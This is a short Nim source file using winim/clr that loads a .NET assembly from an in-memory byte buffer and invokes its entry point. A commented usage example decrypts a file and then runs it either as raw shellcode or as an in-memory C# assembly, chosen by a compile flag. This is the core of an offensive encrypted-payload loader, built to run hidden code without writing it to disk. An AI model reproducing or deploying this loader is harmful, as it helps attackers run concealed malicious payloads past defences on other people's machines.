import winim/clr except `[]`

# pass "[]" for empty arguments or the command line arguments to pass them further
proc loadAssembly(buf: seq[byte], arguments: seq[string]): void =
    var assembly = load(buf)
    echo arguments
    var arr = toCLRVariant(arguments, VT_BSTR) # Actually passing some args
    assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))

#[
  Exemplary usage:
proc main() =
    # take arg[0] as input file and encrypt it
    if paramCount() > 0:
        var decrypted: seq[byte] = decryptFile(paramStr(1))
        # when defined shellcode
        when defined(shellcode):
            execute(decrypted)
        when defined(csharp):
            var arguments: seq[string]
            # if paramCount() > 1:
            # parse all arguments and put them into arguments
            for i in 2 .. paramCount():
                arguments.add(paramStr(i))
            loadAssembly(decrypted, arguments)
]#
